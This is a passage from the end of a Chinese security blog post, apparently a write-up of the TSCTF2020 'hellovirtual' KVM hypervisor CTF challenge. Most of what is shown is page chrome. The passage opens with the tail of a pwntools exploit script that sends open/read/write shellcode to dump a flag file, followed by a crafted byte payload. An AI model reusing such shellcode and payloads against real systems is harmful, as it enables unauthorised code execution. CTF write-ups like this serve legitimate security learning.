class="number">0x2</span>,stack+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">shellcode+= asm(shellcraft.open(<span class="string">'flag_xmzyshypnctql'</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">shellcode+= asm(shellcraft.read(<span class="string">'rax'</span>,stack,<span class="number">0x70</span>))</span><br><span class="line">shellcode+= asm(shellcraft.write(<span class="number">1</span>,stack,<span class="number">0x70</span>))</span><br><span class="line">shellcode+= asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">'\xc8\x59\x01'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+p32(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+<span class="string">'\x73\x0b\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= <span class="string">'\x90'</span>*<span class="number">2</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏还是打残，这是个问题</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://xiaoxiaorenwu.top/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/" title="KVM学习-如何利用kvm写一个自己的Hypervisor">https://xiaoxiaorenwu.top/2020/10/10/KVM学习—利用KVM实现一个简易的Hypervisor/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/summary/" rel="tag"><i class="fa fa-tag"></i> summary</a>
          
            <a href="/tags/KVM/" rel="tag"><i class="fa fa-tag"></i> KVM</a>
          
            <a href="/tags/TSCTF/" rel="tag"><i class="fa fa-tag"></i> TSCTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/08/12/Qemu学习—QOM模型/" rel="next" title="Qemu学习-QOM模型">
                <i class="fa fa-chevron-left"></i> Qemu学习-QOM模型
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/" rel="prev" title="XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析">
                XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">57</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬们的blog~~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KVM-Kernel-Example"><span class="nav-number">2.</span> <span class="nav-text">KVM-Kernel Example</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码学习"><span class="nav-number">3.</span> <span class="nav-text">源码学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hypervisor"><span class="nav-number">3.1.</span> <span class="nav-text">hypervisor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel"><span class="nav-number">3.2.</span> <span class="nav-text">kernel</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TSCTF2020-hellovirtual"><span class="nav-number">4.</span> <span class="nav-text">TSCTF2020_hellovirtual</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hellovirtual-hellouser"><span class="nav-number">4.1.</span> <span class="nav-text">hellovirtual:hellouser</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hellovirtual-hellokernel"><span class="nav-number">4.2.</span> <span class="nav-text">hellovirtual:hellokernel</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xiaoxiaorenwu</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
        placeholder: '欢乐时光就要开始了',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>

